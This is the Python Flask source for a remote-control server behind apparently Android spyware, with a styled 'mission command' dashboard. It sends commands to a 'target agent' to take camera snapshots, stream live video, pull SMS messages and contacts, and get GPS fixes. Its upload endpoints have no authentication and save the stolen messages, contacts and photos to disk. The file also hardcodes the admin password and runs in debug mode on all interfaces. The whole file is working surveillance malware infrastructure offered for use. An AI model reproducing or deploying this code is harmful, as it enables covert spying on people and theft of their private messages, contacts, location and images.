from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for
import os
import base64
from datetime import datetime, timedelta

app = Flask(__name__)
# Secure secret key for session management
app.secret_key = os.urandom(24)

# Folder Structure: mission/captures
MISSION_FOLDER = 'mission'
UPLOAD_FOLDER = os.path.join(MISSION_FOLDER, 'captures')

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

current_action = "none"
current_param = ""
latest_result = "SYSTEM INITIALIZED... WAITING FOR TARGET AGENT CONNECTION."
latest_image = ""
latest_live_data = ""

# Security Configuration for 2026 Advanced Guard
ADMIN_USER = "poonam"
ADMIN_PASS = "radhe@123" # Aap ise apne hisaab se badal sakte hain
MAX_ATTEMPTS = 3
LOCKOUT_TIME_MINUTES = 5

# Track login attempts globally for simplicity (or use DB/cache in production)
login_attempts = 0
lockout_timer = None

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE ACCESS // NOC MISSION COMMAND</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap');
        body {
            background-color: #000205;
            color: #00ffcc;
            font-family: 'Share Tech Mono', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background: linear-gradient(135deg, #050b14 0%, #000205 100%);
            border: 1px solid #1e293b;
            border-top: 4px solid #00ffcc;
            border-radius: 8px;
            padding: 30px;
            width: 350px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.9);
            text-align: center;
        }
        h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 20px;
            color: #00ffcc;
            margin-bottom: 20px;
            letter-spacing: 2px;
            text-shadow: 0 0 15px rgba(0,255,204,0.6);
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #000103;
            border: 1px solid #334155;
            color: #00ffcc;
            border-radius: 4px;
            box-sizing: border-box;
            font-family: 'Share Tech Mono', monospace;
        }
        button {
            background-color: #020617;
            color: #00ffcc;
            border: 1px solid #00ffcc;
            padding: 10px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            font-family: 'Share Tech Mono', monospace;
            margin-top: 10px;
            transition: all 0.3s ease;
            letter-spacing: 1px;
        }
        button:hover {
            background-color: #00ffcc;
            color: #000205;
            box-shadow: 0 0 20px #00ffcc;
        }
        .error {
            color: #ef4444;
            font-size: 13px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>ðŸ”’ RADHA KRISHANA SYSTEM </h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Agent ID / Username" required autocomplete="off">
            <input type="password" name="password" placeholder="Access Passcode" required>
            <button type="submit">AUTHENTICATE</button>
        </form>
        {% if error %}
            <div class="error">{{ error }}</div>
        {% endif %}
    </div>
</body>
</html>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOC MISSION COMMAND // CYBER-OPS 2026</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap');
        body {
            background-color: #000205;
            color: #00ffcc;
            font-family: 'Share Tech Mono', monospace;
            margin: 0;
            padding: 20px;
        }
        h2 {
            text-align: center;
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 5px;
            color: #00ffcc;
            text-shadow: 0 0 25px rgba(0,255,204,0.8);
            margin-bottom: 5px;
            font-size: 28px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .top-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .status-bar {
            text-align: center;
            font-size: 14px;
            color: #4ade80;
            border: 1px solid #059669;
            padding: 10px;
            background: rgba(5, 150, 105, 0.1);
            border-radius: 6px;
            box-shadow: 0 0 25px rgba(74,222,128,0.3);
            letter-spacing: 3px;
            flex-grow: 1;
            margin-right: 15px;
        }
        .logout-btn {
            background-color: #020617;
            color: #ef4444;
            border: 1px solid #ef4444;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            font-family: 'Share Tech Mono', monospace;
            text-decoration: none;
            transition: all 0.3s ease;
            letter-spacing: 1px;
            display: inline-block;
        }
        .logout-btn:hover {
            background-color: #ef4444;
            color: #000205;
            box-shadow: 0 0 25px #ef4444;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .panel {
            background: linear-gradient(135deg, #050b14 0%, #000205 100%);
            border: 1px solid #1e293b;
            border-left: 5px solid #00ffcc;
            border-radius: 8px;
            padding: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.9);
        }
        .panel h4 {
            margin-top: 0;
            font-family: 'Orbitron', sans-serif;
            color: #38bdf8;
            font-size: 13px;
            border-bottom: 1px dashed #334155;
            padding-bottom: 6px;
            letter-spacing: 2px;
        }
        button {
            background-color: #020617;
            color: #00ffcc;
            border: 1px solid #00ffcc;
            padding: 10px 14px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            font-family: 'Share Tech Mono', monospace;
            margin-top: 8px;
            transition: all 0.3s ease;
            letter-spacing: 1px;
        }
        button:hover {
            background-color: #00ffcc;
            color: #000205;
            box-shadow: 0 0 25px #00ffcc;
            transform: translateY(-2px);
        }
        button.stop {
            border-color: #ef4444;
            color: #ef4444;
        }
        button.stop:hover {
            background-color: #ef4444;
            color: #000205;
            box-shadow: 0 0 25px #ef4444;
        }
        button.intel {
            border-color: #f59e0b;
            color: #f59e0b;
        }
        button.intel:hover {
            background-color: #f59e0b;
            color: #000205;
            box-shadow: 0 0 25px #f59e0b;
        }
        input {
            width: 100%;
            padding: 8px;
            margin-top: 6px;
            margin-bottom: 8px;
            background: #000103;
            border: 1px solid #334155;
            color: #00ffcc;
            border-radius: 4px;
            box-sizing: border-box;
            font-family: 'Share Tech Mono', monospace;
        }
        .main-display {
            display: grid;
            grid-template-columns: 1fr 2.4fr;
            gap: 20px;
        }
        @media (max-width: 950px) {
            .main-display {
                grid-template-columns: 1fr;
            }
        }
        .console-box {
            background-color: #000103;
            border: 1px solid #1e293b;
            border-radius: 8px;
            padding: 15px;
            font-family: 'Share Tech Mono', monospace;
            color: #4ade80;
            white-space: pre-wrap;
            height: 480px;
            overflow-y: auto;
            font-size: 13px;
            box-shadow: inset 0 0 25px rgba(0,0,0,0.9);
            border-left: 3px solid #4ade80;
        }
        .viewer-box {
            background-color: #000103;
            border: 1px solid #1e293b;
            border-radius: 8px;
            padding: 15px;
            text-align: center;
            height: 480px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            box-shadow: inset 0 0 25px rgba(0,0,0,0.9);
            border-right: 3px solid #00ffcc;
        }
        .viewer-box img {
            max-width: 100%;
            max-height: 440px;
            border: 2px solid #00ffcc;
            border-radius: 6px;
            box-shadow: 0 0 35px rgba(0,255,204,0.5);
        }
        .section-title {
            font-family: 'Orbitron', sans-serif;
            color: #38bdf8;
            font-size: 15px;
            margin-bottom: 8px;
            border-left: 4px solid #38bdf8;
            padding-left: 8px;
            letter-spacing: 2px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>âš¡ NOC MISSION COMMAND // CYBER-OPS 2026 âš¡</h2>
        
        <div class="top-nav">
            <div class="status-bar">[ MISSION FOLDER ACTIVE // SECURE SESSION LOCKED ]</div>
            <a href="/logout" class="logout-btn">TERMINATE SESSION</a>
        </div>

        <div class="grid">
            <div class="panel">
                <h4>ðŸ“¸ MANUAL SNAPSHOTS</h4>
                <button onclick="sendCommand('task_front_camera')">FRONT SNAPSHOT (HD)</button>
                <button onclick="sendCommand('task_back_camera')">REAR SNAPSHOT (HD)</button>
            </div>

            <div class="panel">
                <h4>ðŸ”´ TACTICAL LIVE STREAM</h4>
                <button onclick="sendCommand('task_live_front')">START FRONT LIVE</button>
                <button onclick="sendCommand('task_live_back')">START REAR LIVE</button>
                <button class="stop" onclick="sendCommand('task_stop_live')">STOP LIVE STREAM</button>
            </div>

            <div class="panel">
                <h4>ðŸ“‚ TARGET INTEL EXTRACT</h4>
                <button class="intel" onclick="sendCommand('task_get_sms')">EXTRACT &amp; SAVE SMS</button>
                <button class="intel" onclick="sendCommand('task_get_contacts')">EXTRACT &amp; SAVE CONTACTS</button>
            </div>

            <div class="panel">
                <h4>ðŸ“� TELEMETRY & AUDIO</h4>
                <button onclick="sendCommand('location_info')">ACQUIRE GPS FIX</button>
                <input type="text" id="tts_txt" value="System Security Alert">
                <button onclick="sendParam('task_speak_toast', document.getElementById('tts_txt').value)">SPEAK &amp; SHOW TOAST</button>
            </div>
        </div>

        <div class="main-display">
            <div>
                <div class="section-title">ðŸ“¥ TARGET TELEMETRY LOGS</div>
                <div class="console-box" id="consoleBox">Awaiting incoming telemetry feed...</div>
            </div>
            <div>
                <div class="section-title">ðŸ‘�ï¸� TACTICAL SURVEILLANCE VIEWER (HD)</div>
                <div class="viewer-box" id="imgViewer">
                    <span style="color: #475569; font-size: 14px; letter-spacing: 2px;">[ WAITING FOR LIVE FEED / SNAPSHOT ]</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        function sendCommand(action) {
            fetch('/set_action?action=' + action).then(res => res.text()).then(d => console.log(d));
        }
        function sendParam(action, param) {
            fetch('/set_action?action=' + action + '&param=' + encodeURIComponent(param)).then(res => res.text()).then(d => console.log(d));
        }

        setInterval(() => {
            fetch('/get_result').then(res => res.text()).then(text => {
                document.getElementById('consoleBox').innerText = text;
            });
            fetch('/get_live_frame').then(res => res.json()).then(data => {
                if(data.image) {
                    document.getElementById('imgViewer').innerHTML = '<img src="data:image/jpeg;base64,' + data.image + '" alt="High-Res Tactical Stream">';
                }
            });
        }, 500);
    </script>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def home():
    global login_attempts, lockout_timer

    # Check if user is already authenticated in the current session
    if session.get('authenticated'):
        return render_template_string(HTML_TEMPLATE)

    # Check if currently locked out
    if lockout_timer and datetime.now() < lockout_timer:
        remaining = int((lockout_timer - datetime.now()).total_seconds())
        return render_template_string(LOGIN_TEMPLATE, error=f"SYSTEM LOCKED: Too many failed attempts. Try again in {remaining}s.")

    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        if username == ADMIN_USER and password == ADMIN_PASS:
            # Reset attempts on successful login
            login_attempts = 0
            lockout_timer = None
            session['authenticated'] = True
            return redirect(url_for('home'))
        else:
            login_attempts += 1
            if login_attempts >= MAX_ATTEMPTS:
                lockout_timer = datetime.now() + timedelta(minutes=LOCKOUT_TIME_MINUTES)
                login_attempts = 0
                return render_template_string(LOGIN_TEMPLATE, error=f"MAX ATTEMPTS REACHED. System locked for {LOCKOUT_TIME_MINUTES} minutes.")
            
            remaining_tries = MAX_ATTEMPTS - login_attempts
            return render_template_string(LOGIN_TEMPLATE, error=f"ACCESS DENIED. Invalid Credentials. {remaining_tries} attempts remaining.")

    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    session.pop('authenticated', None)
    return redirect(url_for('home'))

@app.route('/get_action', methods=['GET'])
def get_action():
    if not session.get('authenticated'):
        return jsonify({"error": "Unauthorized"}), 401
    global current_action, current_param
    res = '{"action":"' + current_action + '","param":"' + current_param + '"}'
    current_action = "none"
    current_param = ""
    return res, 200

@app.route('/post_result', methods=['POST'])
def post_result():
    global latest_result
    result = request.form.get('result', 'No Data')
    latest_result = result

    timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    if "LATEST SMS INBOX" in result:
        txt_path = os.path.join(MISSION_FOLDER, f"sms_intel_{timestamp_str}.txt")
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write(result)
        print(f"\n[+] SMS Intel saved to {txt_path}")
    elif "DEVICE CONTACT LIST" in result:
        txt_path = os.path.join(MISSION_FOLDER, f"contacts_intel_{timestamp_str}.txt")
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write(result)
        print(f"\n[+] Contacts Intel saved to {txt_path}")

    print(f"\n[+] TELEMETRY RECEIVED:\n{result}")
    return "OK", 200

@app.route('/get_result', methods=['GET'])
def get_result():
    if not session.get('authenticated'):
        return "Unauthorized", 401
    global latest_result
    return latest_result, 200

@app.route('/upload_image', methods=['POST'])
def upload_image():
    global latest_result
    try:
        img_data = request.form.get('image', '')
        cam_type = request.form.get('camera', 'unknown')
        if img_data:
            timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"snapshot_{cam_type}_{timestamp_str}.jpg"
            filepath = os.path.join(UPLOAD_FOLDER, filename)

            with open(filepath, "wb") as fh:
                fh.write(base64.b64decode(img_data))

            latest_result = f"=== HD SNAPSHOT SAVED ===\nSensor: {cam_type.upper()}\nPath: mission/captures/{filename}\nTimestamp: {datetime.now().strftime('%H:%M:%S')}"
            return jsonify({"status": "SUCCESS", "filename": filename}), 200
    except Exception as e:
        return jsonify({"status": "ERROR", "message": str(e)}), 500
    return jsonify({"status": "FAILED"}), 400

@app.route('/upload_live_frame', methods=['POST'])
def upload_live_frame():
    global latest_live_data, latest_result
    try:
        img_data = request.form.get('image', '')
        cam_type = request.form.get('camera', 'unknown')
        if img_data:
            latest_live_data = img_data
            latest_result = f"=== HD LIVE STREAM ACTIVE ===\nSensor: {cam_type.upper()}\nFrame Streamed: {datetime.now().strftime('%H:%M:%S')}"
            return jsonify({"status": "SUCCESS"}), 200
    except Exception as e:
        pass
    return jsonify({"status": "FAILED"}), 400

@app.route('/get_live_frame', methods=['GET'])
def get_live_frame():
    if not session.get('authenticated'):
        return jsonify({"error": "Unauthorized"}), 401
    global latest_live_data
    return jsonify({"image": latest_live_data}), 200

@app.route('/set_action', methods=['GET'])
def set_action():
    if not session.get('authenticated'):
        return "Unauthorized", 401
    global current_action, current_param
    current_action = request.args.get('action', 'none')
    current_param = request.args.get('param', '')
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
